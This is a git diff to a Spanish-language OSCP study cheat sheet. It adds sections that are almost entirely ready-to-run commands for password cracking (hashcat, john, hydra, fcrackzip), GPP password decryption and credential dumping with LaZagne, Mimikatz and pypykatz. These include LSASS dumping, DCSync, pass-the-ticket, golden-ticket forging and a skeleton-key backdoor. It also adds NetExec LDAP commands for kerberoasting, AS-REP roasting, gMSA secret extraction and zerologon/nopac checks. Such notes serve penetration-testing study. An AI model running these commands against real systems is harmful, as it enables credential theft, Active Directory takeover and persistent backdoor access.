@@ -101,6 +101,16 @@ Apuntes para la certificación OSCP.
     * 6.6. [Plink](#plink)
     * 6.7. [Netsh](#netsh)
 * 7. [Passwords Attacks](#passwords-attacks)
+    * 7.1. [fcrack](#fcrack)
+    * 7.2. [Group Policy Preferences (GPP)](#group-policy-preferences-(gpp))
+        * 7.2.1. [gpp-decrypt](#gpp-decrypt)
+    * 7.3. [Hashcat](#hashcat)
+        * 7.3.1. [Reglas personalizadas](#reglas-personalizadas)
+    * 7.4. [Hydra](#hydra)
+    * 7.5. [John](#john)
+    * 7.6. [LaZagne](#lazagne)
+    * 7.7. [Mimikatz](#mimikatz)
+    * 7.8. [pypykatz](#pypykatz)
 * 8. [Transferencia de Archivos](#transferencia-de-archivos)
     * 8.1. [Windows](#windows-1)
     * 8.2. [Linux](#linux-1)
@@ -144,6 +154,7 @@ Apuntes para la certificación OSCP.
         * 11.2.3. [BloodHound](#bloodhound)
         * 11.2.4. [ldapsearch](#ldapsearch)
         * 11.2.5. [ldapdomaindump](#ldapdomaindump)
+        * 11.2.6. [NetExec - LDAP](#netexec---ldap)
     * 11.3. [Grupos Privilegiados](#grupos-privilegiados)
         * 11.3.1. [Account Operators](#account-operators)
         * 11.3.2. [Server Operators](#server-operators)
@@ -153,8 +164,9 @@ Apuntes para la certificación OSCP.
         * 11.4.1. [¿Qué es Kerberos?](#¿qué-es-kerberos?)
         * 11.4.2. [AS-REPRoasting](#as-reproasting)
         * 11.4.3. [Kerberoasting](#kerberoasting)
-    * 11.5. [Movimiento Lateral](#movimiento-lateral-1)
-    * 11.6. [Post Explotación](#post-explotación)
+    * 11.5. [Enumeración](#enumeración-4)
+    * 11.6. [Movimiento Lateral](#movimiento-lateral-1)
+    * 11.7. [Post Explotación](#post-explotación)
 * 12. [Herramientas y Recursos](#herramientas-y-recursos)
     * 12.1. [Pivoting](#pivoting-1)
     * 12.2. [Information Gathering](#information-gathering-1)
@@ -1423,6 +1435,167 @@ netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
 
 ##  7. <a name='passwords-attacks'></a>Passwords Attacks
+
+###  7.1. <a name='fcrack'></a>fcrack
+
+```bash
+fcrackzip -u -D -p /ruta/de/la/wordlist/wordlist.txt <FILE>.zip
+```
+
+###  7.2. <a name='group-policy-preferences-(gpp)'></a>Group Policy Preferences (GPP)
+
+####  7.2.1. <a name='gpp-decrypt'></a>gpp-decrypt
+
+```bash
+python3 gpp-decrypt.py -f Groups.xml
+python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
+###  7.3. <a name='hashcat'></a>Hashcat
+
+```bash
+hashcat -m 0 hash.txt /ruta/de/la/wordlist/wordlist.txt           # MD5
+hashcat -m 100 hash.txt /ruta/de/la/wordlist/wordlist.txt         # SHA-1
+hashcat -m 900 hash.txt /ruta/de/la/wordlist/wordlist.txt         # MD4
+hashcat -m 1400 hash.txt /ruta/de/la/wordlist/wordlist.txt        # SHA256
+hashcat -m 3200 hash.txt /ruta/de/la/wordlist/wordlist.txt        # BCRYPT
+hashcat -m 1000 hash.txt /ruta/de/la/wordlist/wordlist.txt        # NTLM
+hashcat -m 5600 hash.txt /ruta/de/la/wordlist/wordlist.txt        # NTMLv2
+hashcat -m 1800 hash.txt /ruta/de/la/wordlist/wordlist.txt        # SHA512
+hashcat -m 160 hash.txt /ruta/de/la/wordlist/wordlist.txt         # HMAC-SHA1
+hashcat -m 160 hash.txt /ruta/de/la/wordlist/wordlist.txt         # HMAC-SHA1
+hashcat -m 18200 -a 0 <FILE> /ruta/de/la/wordlist/wordlist.txt    # ASPREPRoast 
+hashcat -m 13100 --force <FILE> /ruta/de/la/wordlist/wordlist.txt # Kerberoasting 
+hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
+hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
+```
+
+```bash
+/usr/share/wordlists/fasttrack.txt
+/usr/share/hashcat/rules/best64.rule
+```
+
+####  7.3.1. <a name='reglas-personalizadas'></a>Reglas personalizadas
+
+> https://hashcat.net/wiki/doku.php?id=rule_based_attack
+
+##### Agregar 1 a cada contraseña
+
+```bash
+echo \$1 > <FILE>.rule
+```
+
+##### Poner en Mayúscula la primera letra
+
+```bash
+$1
+c
+```
+
+###### No agregue nada, un 1 o un ! a una lista de palabras existente
+
+```bash
+:
+$1
+$!
+```
+
+###### Regla para letras mayúsculas, valores numéricos y caracteres especiales
+
+- `$1` agrega un "1"
+- `$2` agrega un "2"
+- `$3` agrega un "3"
+- `c` Pone en mayúscula la primera letra y en minúscula el resto.
+
+```
+$1 c $!
+$2 c $!
+$1 $2 $3 c $!
+```
+###### Vista previa de la regla
+
+```bash
+hashcat -r <FILE>.rule --stdout <FILE>.txt
+```
+
+###  7.4. <a name='hydra'></a>Hydra
+
+```bash
+hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
+hydra <RHOST> -L <users.txt> -P <passwords.txt> <PROTOCOL>
+hydra <RHOST> -C /ruta/de/la/wordlist/wordlist.txt ftp
+hydra -l <USERNAME> -P <PASSWORDS> <TARGET> <SERVICE> -s <PORT>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/login/:user=^USER^&pass=^PASS^:Invalid password"
+```
+
+###  7.5. <a name='john'></a>John
+
+```bash
+keepass2john <FILE>
+ssh2john id_rsa > <FILE>
+zip2john <FILE> > <FILE>
+john <FILE> --wordlist=/ruta/de/la/wordlist/wordlist.txt --format=crypt
+john <FILE> --rules --wordlist=/ruta/de/la/wordlist/wordlist.txt
+john --show <FILE>
+
+# /etc/passwd
+unshadow passwd shadow > hashes
+john --wordlist-/usr/share/wordlists/rockyou.txt hashes
+```
+
+###  7.6. <a name='lazagne'></a>LaZagne
+
+```bash
+laZagne.exe all
+```
+
+###  7.7. <a name='mimikatz'></a>Mimikatz
+
+```bash
+# Comandos comunes
+token::elevate
+token::revert
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
+
+# Dump Hashes
+.\mimikatz.exe
+sekurlsa::minidump /users/admin/Desktop/lsass.DMP
+sekurlsa::LogonPasswords
+
+# Pass The Ticket
+.\mimikatz.exe
+sekurlsa::tickets /export
+kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
+klist
+dir \\<RHOST>\admin$
+
+# Golden Ticket
+.\mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+misc::cmd
+klist
+dir \\<RHOST>\admin$
+
+# Skeleton Key
+privilege::debug
+misc::skeleton
+net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
+dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
+```
+
+###  7.8. <a name='pypykatz'></a>pypykatz
+
+```bash
+pypykatz lsa minidump lsass.dmp
+pypykatz registry --sam sam system
+```
 
 ##  8. <a name='transferencia-de-archivos'></a>Transferencia de Archivos
 
@@ -4067,6 +4240,31 @@ ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
 
 Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.
 
+####  11.2.6. <a name='netexec---ldap'></a>NetExec - LDAP
+
+```bash
+netexec ldap <RHOST> -u '' -p '' -M -user-desc
+netexec ldap <RHOST> -u '' -p '' -M get-desc-users
+netexec ldap <RHOST> -u '' -p '' -M ldap-checker
+netexec ldap <RHOST> -u '' -p '' -M veeam
+netexec ldap <RHOST> -u '' -p '' -M maq
+netexec ldap <RHOST> -u '' -p '' -M adcs
+netexec ldap <RHOST> -u '' -p '' -M zerologon
+netexec ldap <RHOST> -u '' -p '' -M petitpotam
+netexec ldap <RHOST> -u '' -p '' -M nopac
+netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
+netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
+```
+
 ###  11.3. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
 ####  11.3.1. <a name='account-operators'></a>Account Operators
@@ -4265,9 +4463,16 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerbero
 
 - No ejecutar las cuentas de Servicio como Administrador del Dominio.
 
-###  11.5. <a name='movimiento-lateral-1'></a>Movimiento Lateral
+###  11.5. <a name='enumeración-4'></a>Enumeración
 
-###  11.6. <a name='post-explotación'></a>Post Explotación
+```powershell
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+```
+
+###  11.6. <a name='movimiento-lateral-1'></a>Movimiento Lateral
+
+###  11.7. <a name='post-explotación'></a>Post Explotación
 
 ##  12. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
 
